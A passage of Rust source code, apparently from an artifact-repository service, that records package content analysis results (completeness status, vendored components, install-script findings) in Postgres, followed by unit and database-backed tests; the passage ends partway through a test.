//! Persist what we learned by reading an artifact's own bytes (#4033).
//!
//! This is the seam between extraction and the API. The format handler pulls
//! files out of a package; [`conda_recipe`] and [`conda_scripts`] turn those
//! bytes into findings; this module writes the findings to the three tables
//! created by migration 221, and [`crate::api::handlers::package_analysis`]
//! reads them back.
//!
//! # The contract that matters
//!
//! A caller MUST record a [`Completeness`] describing how much of the package
//! it managed to read, and it must do so *even when extraction failed*. An
//! artifact with no `package_analysis` row is reported as "never analyzed";
//! an artifact with a row and `status = not_read` is reported as "we tried and
//! could not read it". Both are honest. What must never happen is a row
//! claiming `Complete` on a package whose bytes were never opened, because
//! downstream that renders as a clean bill of health — the precise defect
//! #4035/#4036 exist to remove.
//!
//! [`record_analysis`] therefore takes `Completeness` as a required argument
//! rather than deriving it from whether the inputs happen to be empty. An
//! empty component list is not evidence of anything on its own; only the
//! caller knows whether it looked.

use sqlx::PgPool;
use uuid::Uuid;

use crate::error::{AppError, Result};
use crate::services::conda_recipe::{self, RecipeFormat, SourceConfidence};
use crate::services::conda_scripts;

/// How much of a package the caller managed to read.
///
/// Mirrors the `status` CHECK in migration 221. Deliberately has no `Default`:
/// there is no safe value to fall back to, and a caller that has not decided
/// must not be able to omit it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Completeness {
    /// The payload was read in full.
    Complete,
    /// Some of the payload was read; the rest was not.
    Partial {
        reason: String,
        files_read: i32,
        files_total: i32,
    },
    /// The payload was never opened — a failed extraction, an unreadable
    /// container, a size ceiling hit before any entry was produced.
    NotRead { reason: String },
    /// This format has no content analysis implemented.
    Unsupported { reason: String },
}

impl Completeness {
    fn status(&self) -> &'static str {
        match self {
            Completeness::Complete => "complete",
            Completeness::Partial { .. } => "partial",
            Completeness::NotRead { .. } => "not_read",
            Completeness::Unsupported { .. } => "unsupported",
        }
    }

    fn reason(&self) -> Option<&str> {
        match self {
            Completeness::Complete => None,
            Completeness::Partial { reason, .. }
            | Completeness::NotRead { reason }
            | Completeness::Unsupported { reason } => Some(reason.as_str()),
        }
    }

    fn counts(&self) -> (Option<i32>, Option<i32>) {
        match self {
            Completeness::Partial {
                files_read,
                files_total,
                ..
            } => (Some(*files_read), Some(*files_total)),
            _ => (None, None),
        }
    }
}

/// A component the caller extracted itself, for formats with no recipe to
/// parse.
///
/// A wheel declares nothing about what it vendors; its native libraries are
/// discovered from the archive's own directory listing. The recipe-parsing
/// path cannot serve that case, so the caller does the extraction and hands
/// over the result.
#[derive(Debug, Clone)]
pub struct ExtractedComponent {
    pub name: String,
    /// An upstream RELEASE version, or `None`. Never an ABI/soname number --
    /// see `abi_version`.
    pub version: Option<String>,
    pub purl: Option<String>,
    pub source_url: Option<String>,
    pub git_url: Option<String>,
    pub git_rev: Option<String>,
    pub sha256: Option<String>,
    pub applied_patches: Vec<String>,
    pub confidence: SourceConfidence,
    pub detection_method: String,
    /// The library's linker name, e.g. `libwebp.so.7.1.3`.
    pub soname: Option<String>,
    /// The ELF/libtool ABI version. Recorded, never promoted to `version`.
    pub abi_version: Option<String>,
}

/// A script we found, can prove executes, and deliberately did not analyze.
///
/// Carries its own byte count rather than deriving one from `script.body`,
/// because the body may be a lossy decode of non-UTF-8 source. `U+FFFD` is
/// three bytes, so a four-byte file of invalid bytes would otherwise be
/// recorded as twelve — a wrong number in a numeric column, which is worse
/// than an absent one because nothing downstream can tell it is wrong.
#[derive(Debug, Clone)]
pub struct UnanalyzedScript {
    pub script: conda_scripts::InstallScript,
    /// Size of the ORIGINAL bytes in the archive, not of `script.body`.
    pub original_size_bytes: i64,
    /// Why no rules were run. Stored, surfaced in the API, read by a human.
    pub reason: String,
}

/// Everything the format handler extracted, ready to be analyzed.
pub struct PackageAnalysisInput {
    pub artifact_id: Uuid,
    pub format: String,
    /// Files found under `info/recipe/`, as `(filename, bytes)`. Order does
    /// not matter: [`conda_recipe::preferred_recipe_files`] decides which one
    /// is authoritative.
    pub recipe_files: Vec<(String, Vec<u8>)>,
    /// Candidate install scripts from the payload, as `(path, bytes)`. Paths
    /// that are not install scripts are ignored, so a caller may pass the
    /// whole file list rather than pre-filtering.
    pub script_files: Vec<(String, Vec<u8>)>,
    /// Install hooks whose body lives in a manifest rather than a payload file
    /// — npm's `scripts.postinstall`, for example. Already classified by the
    /// caller, since a manifest key names the hook directly and there is no
    /// path to infer it from.
    ///
    /// Kept separate from `script_files` rather than synthesised into it: a
    /// fake path would have to round-trip through `classify_script_path`, and
    /// inventing `bin/.pkg-postinstall.sh` to satisfy a regex would be a lie
    /// stored in the `path` column that a user later reads.
    pub inline_scripts: Vec<conda_scripts::InstallScript>,
    /// Scripts we found, can prove execute, and deliberately did NOT analyse,
    /// paired with the reason. The canonical case is a declared interpreter the
    /// rule engine does not read — an RPM scriptlet with
    /// `PREINPROG = /usr/bin/lua`, a Perl Debian maintainer script.
    ///
    /// These are stored with `findings = NULL`, which is a different fact from
    /// `findings = []`. Running shell rules over Lua would be wrong in both
    /// directions: it would miss real behaviour and invent matches. Dropping
    /// the script entirely would be worse still — it exists, it runs, and on
    /// RPM/Debian it runs as root.
    pub unanalyzed_scripts: Vec<UnanalyzedScript>,
    /// Components the caller extracted directly, for formats with no recipe.
    /// Merged with anything parsed out of `recipe_files`.
    pub components: Vec<ExtractedComponent>,
    pub completeness: Completeness,
}

/// Translate a [`conda_scripts::ScriptFinding`] into the JSON shape the API
/// publishes and the web client parses.
///
/// The analyzer's own field names (`rule`, `excerpt`, `explanation`) and the
/// published contract (`rule_id`, `snippet`, `description`) diverged because
/// they were specified separately — the analyzer for a Rust consumer, the
/// contract for a TypeScript one. Rather than rename the analyzer's fields and
/// churn its test suite, or loosen the client parser, the mapping is pinned
/// here at the single point where findings become stored JSON.
///
/// `title` has no analyzer equivalent: the client needs a short human label
/// distinct from the full explanation, so the rule id is humanised
/// (`remote-code-execution` -> `Remote code execution`). Deriving it rather
/// than storing a second string keeps the rule id as the one source of truth.
fn finding_to_api_json(f: &conda_scripts::ScriptFinding) -> serde_json::Value {
    let mut title = f.rule.replace('-', " ");
    if let Some(first) = title.get_mut(0..1) {
        first.make_ascii_uppercase();
    }
    serde_json::json!({
        "rule_id": f.rule,
        "severity": format!("{:?}", f.severity).to_lowercase(),
        "title": title,
        "description": f.explanation,
        "line": f.line,
        "snippet": f.excerpt,
    })
}

fn findings_to_api_json(findings: &[conda_scripts::ScriptFinding]) -> serde_json::Value {
    serde_json::Value::Array(findings.iter().map(finding_to_api_json).collect())
}

/// True for the recipe's archived copy of a script, as opposed to the copy in
/// the payload that actually executes at install time.
fn is_recipe_copy(path: &str) -> bool {
    path.contains("info/recipe/")
}

fn confidence_str(c: &SourceConfidence) -> &'static str {
    match c {
        SourceConfidence::Declared => "declared",
        SourceConfidence::Inferred => "inferred",
        SourceConfidence::Unresolved => "unresolved",
    }
}

/// Pick the authoritative recipe from what was extracted.
///
/// Returns the parsed recipe plus the filename it came from, so the caller can
/// record *which* file the components were derived from — a component sourced
/// from `meta.yaml.template` deserves less trust than one from
/// `rendered_recipe.yaml`, and that provenance is otherwise lost.
fn pick_recipe(files: &[(String, Vec<u8>)]) -> Option<(&str, RecipeFormat, Vec<u8>)> {
    for (name, format) in conda_recipe::preferred_recipe_files() {
        if let Some((found, bytes)) = files.iter().find(|(f, _)| {
            // Handlers may hand us a full path or a bare filename.
            f == name || f.ends_with(&format!("/{name}"))
        }) {
            return Some((found.as_str(), *format, bytes.clone()));
        }
    }
    None
}

/// Record analysis for a package whose only content signal is a set of install
/// hooks.
///
/// This is the shape every format except conda currently has: npm reads
/// `scripts.*` out of `package.json`, RPM reads scriptlet tags out of the
/// header, Debian reads maintainer scripts out of `control.tar`. None of them
/// has a recipe, and in each case the caller has already classified the hook,
/// so the full [`PackageAnalysisInput`] is mostly empty fields.
///
/// Exists so those formats share one wiring path instead of four near-identical
/// copies — which is both a duplication-gate concern and, more importantly, the
/// difference between fixing a bug here once and fixing it four times.
///
/// `completeness` is still required, and still means what it always means: a
/// caller that could not read the archive passes `NotRead`, never `Complete`
/// with an empty list.
pub async fn record_install_scripts(
    db: &PgPool,
    artifact_id: Uuid,
    format: &str,
    inline_scripts: Vec<conda_scripts::InstallScript>,
    unanalyzed_scripts: Vec<UnanalyzedScript>,
    completeness: Completeness,
) -> Result<()> {
    record_analysis(
        db,
        PackageAnalysisInput {
            artifact_id,
            format: format.to_string(),
            recipe_files: Vec::new(),
            script_files: Vec::new(),
            inline_scripts,
            unanalyzed_scripts,
            components: Vec::new(),
            completeness,
        },
    )
    .await
}

/// Analyze and persist. Idempotent: re-analyzing an artifact replaces its
/// previous rows rather than accumulating duplicates.
pub async fn record_analysis(db: &PgPool, input: PackageAnalysisInput) -> Result<()> {
    let PackageAnalysisInput {
        artifact_id,
        format,
        recipe_files,
        script_files,
        inline_scripts,
        unanalyzed_scripts,
        components,
        completeness,
    } = input;

    let mut tx = db
        .begin()
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;

    // Replace wholesale. Analysis is a pure function of the artifact's bytes
    // plus the current rule set, so a re-run supersedes rather than adds to
    // what came before; merging would strand findings from a rule we have
    // since deleted.
    sqlx::query("DELETE FROM package_vendored_components WHERE artifact_id = $1")
        .bind(artifact_id)
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;
    sqlx::query("DELETE FROM package_install_scripts WHERE artifact_id = $1")
        .bind(artifact_id)
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;

    let (files_read, files_total) = completeness.counts();
    sqlx::query(
        "INSERT INTO package_analysis \
           (artifact_id, format, status, reason, files_total, files_read, analyzed_at) \
         VALUES ($1, $2, $3, $4, $5, $6, NOW()) \
         ON CONFLICT (artifact_id) DO UPDATE SET \
           format = EXCLUDED.format, status = EXCLUDED.status, \
           reason = EXCLUDED.reason, files_total = EXCLUDED.files_total, \
           files_read = EXCLUDED.files_read, analyzed_at = EXCLUDED.analyzed_at",
    )
    .bind(artifact_id)
    .bind(&format)
    .bind(completeness.status())
    .bind(completeness.reason())
    .bind(files_total)
    .bind(files_read)
    .execute(&mut *tx)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    // A recipe that fails to parse is NOT a reason to fail ingest: the package
    // is still valid and its scripts are still worth reporting. But it must
    // not silently look like "no vendored components" either, so the failure
    // is logged and the component list stays empty while `completeness`
    // continues to say what it always said.
    //
    // `recipe_declares_sources` gates the binary-derived components below
    // (#4046): banner matching has a real false-positive rate, so it is spent
    // only on packages whose recipe says nothing — the residue the binary
    // cataloger exists for. A package with a parsed recipe that declares
    // sources is not second-guessed by its bytes.
    let mut recipe_declares_sources = false;
    if let Some((source_file, recipe_format, bytes)) = pick_recipe(&recipe_files) {
        match conda_recipe::parse_recipe(&bytes, recipe_format) {
            Ok(parsed) => {
                recipe_declares_sources = !parsed.sources.is_empty();
                for c in &parsed.sources {
                    let patches = serde_json::json!(c
                        .patches
                        .iter()
                        .map(|p| serde_json::json!({ "name": p }))
                        .collect::<Vec<_>>());
                    sqlx::query(
                        "INSERT INTO package_vendored_components \
                           (artifact_id, name, version, purl, source_url, git_url, git_rev, \
                            sha256, applied_patches, confidence, detection_method) \
                         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) \
                         ON CONFLICT (artifact_id, name, COALESCE(version, '')) DO NOTHING",
                    )
                    .bind(artifact_id)
                    .bind(&c.name)
                    .bind(c.version.as_deref())
                    .bind(c.purl.as_deref())
                    .bind(c.source_url.as_deref())
                    .bind(c.git_url.as_deref())
                    .bind(c.git_rev.as_deref())
                    .bind(c.sha256.as_deref())
                    .bind(&patches)
                    .bind(confidence_str(&c.confidence))
                    .bind(format!("recipe:{source_file}"))
                    .execute(&mut *tx)
                    .await
                    .map_err(|e| AppError::Database(e.to_string()))?;
                }
                if !parsed.unresolved_expressions.is_empty() {
                    tracing::info!(
                        artifact_id = %artifact_id,
                        count = parsed.unresolved_expressions.len(),
                        "conda recipe had unresolved template expressions"
                    );
                }
            }
            Err(e) => {
                tracing::warn!(
                    artifact_id = %artifact_id,
                    source_file = %source_file,
                    error = %e,
                    "conda recipe could not be parsed; no vendored components recorded"
                );
            }
        }
    }

    // Components the caller extracted directly (wheels, and any future format
    // with no recipe). Same table, same ON CONFLICT: a recipe-derived and a
    // caller-extracted row for the same name+version is one component seen two
    // ways, not two components.
    for c in &components {
        // Binary-derived components (#4046) yield to a recipe that speaks:
        // they are the lower-confidence signal, recorded only where no recipe
        // declared a source. Identified by the `binary:` method prefix, which
        // `binary_catalog` owns — every detection_method it emits starts with
        // it and no other producer uses it.
        if recipe_declares_sources && c.detection_method.starts_with("binary:") {
            continue;
        }
        let patches = serde_json::json!(c
            .applied_patches
            .iter()
            .map(|p| serde_json::json!({ "name": p }))
            .collect::<Vec<_>>());
        sqlx::query(
            "INSERT INTO package_vendored_components \
               (artifact_id, name, version, purl, source_url, git_url, git_rev, \
                sha256, applied_patches, confidence, detection_method, soname, \
                abi_version) \
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13) \
             ON CONFLICT (artifact_id, name, COALESCE(version, '')) DO NOTHING",
        )
        .bind(artifact_id)
        .bind(&c.name)
        .bind(c.version.as_deref())
        .bind(c.purl.as_deref())
        .bind(c.source_url.as_deref())
        .bind(c.git_url.as_deref())
        .bind(c.git_rev.as_deref())
        .bind(c.sha256.as_deref())
        .bind(&patches)
        .bind(confidence_str(&c.confidence))
        .bind(&c.detection_method)
        .bind(c.soname.as_deref())
        .bind(c.abi_version.as_deref())
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;
    }

    // `classify_script_path` is liberal by design, and a conda package ships
    // the SAME script body twice: once in the payload where it actually runs
    // (`bin/.pkg-post-link.sh`) and once as the recipe's copy of it
    // (`info/recipe/post-link.sh`). Reporting both would double every finding
    // on every package that has a script — and an inflated count is the
    // fastest way to make a reviewer stop trusting the number.
    //
    // Dedupe on the body digest, keeping the payload path: that is the copy
    // that executes at install time, so it is the one a reader should be
    // looking at.
    let mut by_digest: std::collections::HashMap<String, (&String, &Vec<u8>)> =
        std::collections::HashMap::new();
    for (path, bytes) in &script_files {
        if conda_scripts::classify_script_path(path).is_none() {
            continue;
        }
        let digest = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(bytes));
        match by_digest.get(&digest) {
            // A path already seen wins only if the incumbent is the recipe's
            // copy and this one is not.
            Some((existing, _)) if is_recipe_copy(existing) && !is_recipe_copy(path) => {
                by_digest.insert(digest, (path, bytes));
            }
            Some(_) => {}
            None => {
                by_digest.insert(digest, (path, bytes));
            }
        }
    }

    let mut deduped: Vec<(&String, &Vec<u8>)> = by_digest.into_values().collect();
    // HashMap iteration order is nondeterministic; sort so repeated analyses
    // of the same artifact produce identical rows.
    deduped.sort_by(|a, b| a.0.cmp(b.0));

    for (path, bytes) in deduped {
        let path = path.as_str();
        // `make_script` returns None for a non-UTF8 body. The script still
        // exists and the user must be told so: we record it with a NULL body,
        // which the API renders as `content_available: false` and the UI as
        // "contents could not be read" rather than "no findings".
        match conda_scripts::make_script(path, bytes.as_slice()) {
            Some(script) => {
                let findings = findings_to_api_json(&conda_scripts::analyze_script(&script));
                insert_script(
                    &mut tx,
                    artifact_id,
                    path,
                    script.kind.as_str(),
                    bytes.len() as i64,
                    &script.sha256,
                    Some(script.body.as_str()),
                    &findings,
                )
                .await?;
            }
            None => {
                let digest = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(bytes.as_slice()));
                insert_script(
                    &mut tx,
                    artifact_id,
                    path,
                    "unknown",
                    bytes.len() as i64,
                    &digest,
                    None,
                    &serde_json::json!([]),
                )
                .await?;
            }
        }
    }

    // Manifest-embedded hooks. Same analyzer, same table; only the origin of
    // the bytes differs.
    for script in &inline_scripts {
        let findings = findings_to_api_json(&conda_scripts::analyze_script(script));
        insert_script(
            &mut tx,
            artifact_id,
            &script.path,
            script.kind.as_str(),
            script.body.len() as i64,
            &script.sha256,
            Some(script.body.as_str()),
            &findings,
        )
        .await?;
    }

    // Scripts we are not qualified to judge. `findings` stays NULL and the
    // reason travels with the row; the API renders it as "not analysed", never
    // as zero findings.
    for u in &unanalyzed_scripts {
        insert_unanalyzed_script(&mut tx, artifact_id, u).await?;
    }

    tx.commit()
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;
    Ok(())
}

async fn insert_unanalyzed_script(
    tx: &mut sqlx::Transaction<'_, sqlx::Postgres>,
    artifact_id: Uuid,
    u: &UnanalyzedScript,
) -> Result<()> {
    let script = &u.script;
    sqlx::query(
        "INSERT INTO package_install_scripts \
           (artifact_id, path, kind, size_bytes, sha256, body, findings, \
            analysis_skipped_reason) \
         VALUES ($1,$2,$3,$4,$5,$6,NULL,$7) \
         ON CONFLICT (artifact_id, path) DO UPDATE SET \
           kind = EXCLUDED.kind, size_bytes = EXCLUDED.size_bytes, \
           sha256 = EXCLUDED.sha256, body = EXCLUDED.body, \
           findings = NULL, \
           analysis_skipped_reason = EXCLUDED.analysis_skipped_reason",
    )
    .bind(artifact_id)
    .bind(&script.path)
    .bind(script.kind.as_str())
    .bind(u.original_size_bytes)
    .bind(&script.sha256)
    .bind(script.body.as_str())
    .bind(&u.reason)
    .execute(&mut **tx)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;
    Ok(())
}

#[allow(clippy::too_many_arguments)]
async fn insert_script(
    tx: &mut sqlx::Transaction<'_, sqlx::Postgres>,
    artifact_id: Uuid,
    path: &str,
    kind: &str,
    size_bytes: i64,
    sha256: &str,
    body: Option<&str>,
    findings: &serde_json::Value,
) -> Result<()> {
    sqlx::query(
        "INSERT INTO package_install_scripts \
           (artifact_id, path, kind, size_bytes, sha256, body, findings) \
         VALUES ($1,$2,$3,$4,$5,$6,$7) \
         ON CONFLICT (artifact_id, path) DO UPDATE SET \
           kind = EXCLUDED.kind, size_bytes = EXCLUDED.size_bytes, \
           sha256 = EXCLUDED.sha256, body = EXCLUDED.body, \
           findings = EXCLUDED.findings",
    )
    .bind(artifact_id)
    .bind(path)
    .bind(kind)
    .bind(size_bytes)
    .bind(sha256)
    .bind(body)
    .bind(findings)
    .execute(&mut **tx)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;
    Ok(())
}

#[cfg(ak_test_shard = "services-1")]
#[cfg(test)]
mod tests {
    use super::*;

    fn f(name: &str) -> (String, Vec<u8>) {
        (name.to_string(), b"x".to_vec())
    }

    #[test]
    fn pick_recipe_prefers_rendered_over_template() {
        let files = vec![
            f("meta.yaml.template"),
            f("meta.yaml"),
            f("rendered_recipe.yaml"),
        ];
        let (name, format, _) = pick_recipe(&files).expect("a recipe");
        assert_eq!(name, "rendered_recipe.yaml");
        assert_eq!(format, RecipeFormat::RenderedRecipeYaml);
    }

    #[test]
    fn pick_recipe_falls_back_through_the_preference_order() {
        let files = [f("meta.yaml.template"), f("meta.yaml")];
        let (name, _, _) = pick_recipe(&files).unwrap();
        assert_eq!(name, "meta.yaml", "rendered beats the raw template");

        let files = [f("meta.yaml.template")];
        let (name, _, _) = pick_recipe(&files).unwrap();
        assert_eq!(name, "meta.yaml.template", "last resort is still used");
    }

    #[test]
    fn pick_recipe_matches_full_paths_not_just_bare_names() {
        let files = [f("info/recipe/rendered_recipe.yaml")];
        let (name, _, _) = pick_recipe(&files).unwrap();
        assert_eq!(name, "info/recipe/rendered_recipe.yaml");
    }

    #[test]
    fn pick_recipe_is_none_when_there_is_no_recipe() {
        assert!(pick_recipe(&[f("info/index.json"), f("README.md")]).is_none());
    }

    #[test]
    fn pick_recipe_ignores_a_lookalike_suffix() {
        // "not-meta.yaml" must not satisfy the "meta.yaml" entry: the suffix
        // match is anchored on a path separator precisely so a file merely
        // ENDING in a preferred name cannot impersonate it.
        assert!(pick_recipe(&[f("not-meta.yaml")]).is_none());
    }

    #[test]
    fn completeness_never_reports_a_reasonless_incomplete_state() {
        // Mirrors the CHECK constraint in migration 221: anything that is not
        // `complete` must carry a reason, or the row is rejected by the DB.
        for c in [
            Completeness::Partial {
                reason: "ceiling".into(),
                files_read: 1,
                files_total: 2,
            },
            Completeness::NotRead {
                reason: "unreadable".into(),
            },
            Completeness::Unsupported {
                reason: "no analyzer".into(),
            },
        ] {
            assert_ne!(c.status(), "complete");
            assert!(c.reason().is_some(), "{:?} must carry a reason", c);
        }
        assert_eq!(Completeness::Complete.status(), "complete");
        assert!(Completeness::Complete.reason().is_none());
    }

    #[test]
    fn only_partial_carries_file_counts() {
        assert_eq!(
            Completeness::Partial {
                reason: "r".into(),
                files_read: 3,
                files_total: 7
            }
            .counts(),
            (Some(3), Some(7))
        );
        assert_eq!(Completeness::Complete.counts(), (None, None));
        assert_eq!(
            Completeness::NotRead { reason: "r".into() }.counts(),
            (None, None)
        );
    }
}

/// DB-backed tests for [`record_analysis`] (#4033).
///
/// Everything below writes through the real transaction against a real
/// Postgres, because the invariants worth pinning are invariants of what
/// lands in the three tables — a replaced row, a deduplicated script, a NULL
/// that is not an empty array — and none of them is observable from the pure
/// helpers above.
///
/// Every row these tests write is keyed on an artifact created by
/// [`seed_artifact`], so they need no serialization against the rest of the
/// suite. Skips cleanly when no `DATABASE_URL` is configured; under
/// [`crate::testing::REQUIRE_DB_ENV`] (CI) an unreachable database fails
/// loudly instead of reporting a false PASS (#2924).
#[cfg(ak_test_shard = "services-1")]
#[cfg(test)]
mod db_tests {
    use super::*;
    use crate::services::conda_scripts::ScriptKind;
    use sqlx::Row;

    async fn try_pool() -> Option<PgPool> {
        crate::testing::try_pool_with(3).await
    }

    /// The FK chain is `package_analysis.artifact_id -> artifacts ->
    /// repositories`, so every test needs both parents. One helper, reused:
    /// four copy-pasted setups would trip the duplication gate and would be
    /// four places to fix when a NOT NULL column is added.
    async fn seed_artifact(pool: &PgPool) -> Uuid {
        // Reap this module's OWN fixtures from earlier runs before adding
        // another. Nothing here needs it for correctness — every assertion is
        // scoped to the artifact created below — but `repositories` is
        // cluster-wide state that other suites list UNSCOPED with a LIMIT
        // (`api::handlers::projects::tests::db::        // test_listing_visibility_and_project_filter` asserts its own
        // repository is on page one of `ORDER BY name LIMIT 100`), so a suite
        // that leaks a row per test per run eventually pushes somebody else's
        // fixture off that page. The grace period is orders of magnitude
        // longer than these tests take, so a sibling nextest process holding a
        // live fixture is never reaped out from under itself.
        sqlx::query(
            "DELETE FROM repositories              WHERE key LIKE 'pa-%' AND created_at < NOW() - INTERVAL '10 minutes'",
        )
        .execute(pool)
        .await
        .expect("reap stale fixtures");

        let repo = Uuid::new_v4();
        let key = format!("pa-{}", &repo.to_string()[..8]);
        sqlx::query(
            "INSERT INTO repositories \
               (id, key, name, format, repo_type, storage_backend, storage_path, is_public) \
             VALUES ($1, $2, $2, 'generic'::repository_format, 'local'::repository_type, \
                     'filesystem', $3, true)",
        )
        .bind(repo)
        .bind(&key)
        .bind(format!("/data/{key}"))
        .execute(pool)
        .await
        .expect("insert repository");

        let artifact = Uuid::new_v4();
        sqlx::query(
            "INSERT INTO artifacts \
               (id, repository_id, path, name, size_bytes, checksum_sha256, content_type, \
                storage_key, is_deleted) \
             VALUES ($1, $2, $3, $3, 1024, repeat('a', 64), 'application/octet-stream', $4, false)",
        )
        .bind(artifact)
        .bind(repo)
        .bind(format!("{key}/pkg-1.0-0.conda"))
        .bind(format!("cas/{artifact}"))
        .execute(pool)
        .await
        .expect("insert artifact");
        artifact
    }

    /// A [`PackageAnalysisInput`] with nothing extracted. Tests fill in only
    /// the field they are about, which keeps each one readable as a statement
    /// about that field.
    fn empty_input(artifact_id: Uuid, completeness: Completeness) -> PackageAnalysisInput {
        PackageAnalysisInput {
            artifact_id,
            format: "conda".to_string(),
            recipe_files: Vec::new(),
            script_files: Vec::new(),
            inline_scripts: Vec::new(),
            unanalyzed_scripts: Vec::new(),
            components: Vec::new(),
            completeness,
        }
    }

    fn extracted(name: &str, version: Option<&str>) -> ExtractedComponent {
        ExtractedComponent {
            name: name.to_string(),
            version: version.map(str::to_string),
            purl: None,
            source_url: None,
            git_url: None,
            git_rev: None,
            sha256: None,
            applied_patches: Vec::new(),
            confidence: SourceConfidence::Inferred,
            detection_method: "caller".to_string(),
            soname: None,
            abi_version: None,
        }
    }

    /// A rendered conda-build `meta.yaml`: one resolvable source plus one
    /// entry with no locator, which the parser reports as an unresolved
    /// expression rather than dropping.
    const META_YAML: &str = r#"
package:
  name: pillow
  version: '10.2.0'
source:
  - url: https://pypi.io/packages/source/p/pillow/pillow-10.2.0.tar.gz
    sha256: e87f0b2c78157e12d7686b27d63c070fd65d994e8ddae6f328e0dcf4a0cd007e
    patches:
      - 0001-fix-cve-2023-4863.patch
  - folder: vendored-but-unlocatable
about:
  home: https://python-pillow.org
"#;

    struct AnalysisRow {
        format: String,
        status: String,
        reason: Option<String>,
        files_total: Option<i32>,
        files_read: Option<i32>,
    }

    /// Returned as a `Vec` so callers can assert on the ROW COUNT: "exactly
    /// one analysis row" is half of the re-analysis invariant.
    async fn analysis_rows(pool: &PgPool, artifact: Uuid) -> Vec<AnalysisRow> {
        sqlx::query(
            "SELECT format, status, reason, files_total, files_read \
             FROM package_analysis WHERE artifact_id = $1",
        )
        .bind(artifact)
        .fetch_all(pool)
        .await
        .expect("read package_analysis")
        .into_iter()
        .map(|r| AnalysisRow {
            format: r.get("format"),
            status: r.get("status"),
            reason: r.get("reason"),
            files_total: r.get("files_total"),
            files_read: r.get("files_read"),
        })
        .collect()
    }

    struct ComponentRow {
        name: String,
        version: Option<String>,
        purl: Option<String>,
        sha256: Option<String>,
        applied_patches: serde_json::Value,
        confidence: String,
        detection_method: Option<String>,
        soname: Option<String>,
        abi_version: Option<String>,
    }

    async fn component_rows(pool: &PgPool, artifact: Uuid) -> Vec<ComponentRow> {
        sqlx::query(
            "SELECT name, version, purl, sha256, applied_patches, confidence, \
                    detection_method, soname, abi_version \
             FROM package_vendored_components WHERE artifact_id = $1 ORDER BY name",
        )
        .bind(artifact)
        .fetch_all(pool)
        .await
        .expect("read package_vendored_components")
        .into_iter()
        .map(|r| ComponentRow {
            name: r.get("name"),
            version: r.get("version"),
            purl: r.get("purl"),
            sha256: r.get("sha256"),
            applied_patches: r.get("applied_patches"),
            confidence: r.get("confidence"),
            detection_method: r.get("detection_method"),
            soname: r.get("soname"),
            abi_version: r.get("abi_version"),
        })
        .collect()
    }

    struct ScriptRow {
        path: String,
        kind: String,
        size_bytes: i64,
        body: Option<String>,
        findings: Option<serde_json::Value>,
        skipped_reason: Option<String>,
    }

    async fn script_rows(pool: &PgPool, artifact: Uuid) -> Vec<ScriptRow> {
        sqlx::query(
            "SELECT path, kind, size_bytes, body, findings, analysis_skipped_reason \
             FROM package_install_scripts WHERE artifact_id = $1 ORDER BY path",
        )
        .bind(artifact)
        .fetch_all(pool)
        .await
        .expect("read package_install_scripts")
        .into_iter()
        .map(|r| ScriptRow {
            path: r.get("path"),
            kind: r.get("kind"),
            size_bytes: r.get("size_bytes"),
            body: r.get("body"),
            findings: r.get("findings"),
            skipped_reason: r.get("analysis_skipped_reason"),
        })
        .collect()
    }

    /// INVARIANT 1: `Completeness` is a required argument, never derived from
    /// emptiness. A caller that passed `NotRead` with zero components must
    /// produce a row that CANNOT be read as a clean bill of health — the
    /// precise defect #4035/#4036 exist to remove.
    #[tokio::test]
    async fn not_read_with_no_components_is_not_readable_as_clean() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        record_analysis(
            &pool,
            empty_input(
                artifact,
                Completeness::NotRead {
                    reason: "archive exceeded the 2 GiB extraction ceiling".to_string(),
                },
            ),
        )
        .await
        .expect("record_analysis");

        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].status, "not_read",
            "an empty component list must not be laundered into 'complete'"
        );
        assert_eq!(
            rows[0].reason.as_deref(),
            Some("archive exceeded the 2 GiB extraction ceiling"),
            "the reason is what the UI renders instead of 'no findings'"
        );
        assert_eq!(rows[0].format, "conda");
        assert!(component_rows(&pool, artifact).await.is_empty());
        assert!(script_rows(&pool, artifact).await.is_empty());
    }

    /// The same zero inputs with `Complete` are a different, equally honest
    /// fact: we opened the package and it vendors nothing. Paired with the
    /// test above, this is the whole point of taking `Completeness` as an
    /// argument — identical inputs, different stored meaning.
    #[tokio::test]
    async fn partial_records_the_file_counts_and_complete_records_none() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        record_analysis(
            &pool,
            empty_input(
                artifact,
                Completeness::Partial {
                    reason: "3 of 9 entries exceeded the per-file ceiling".to_string(),
                    files_read: 6,
                    files_total: 9,
                },
            ),
        )
        .await
        .expect("record partial");
        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows[0].status, "partial");
        assert_eq!(
            (rows[0].files_read, rows[0].files_total),
            (Some(6), Some(9))
        );

        record_analysis(&pool, empty_input(artifact, Completeness::Complete))
            .await
            .expect("record complete");
        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows[0].status, "complete");
        assert_eq!(rows[0].reason, None, "a complete read explains nothing");
        assert_eq!(
            (rows[0].files_read, rows[0].files_total),
            (None, None),
            "stale counts from the previous partial run must not survive"
        );
    }

    /// INVARIANT 2: re-analysis REPLACES, it does not accumulate. Analysis is
    /// a pure function of the bytes plus the current rule set, so a second run
    /// supersedes the first; merging would strand a finding from a rule we
    /// have since deleted.
    #[tokio::test]
    async fn re_analysis_replaces_the_previous_rows_rather_than_accumulating() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut first = empty_input(artifact, Completeness::Complete);
        first.components = vec![extracted("libwebp", Some("1.3.2")), extracted("zlib", None)];
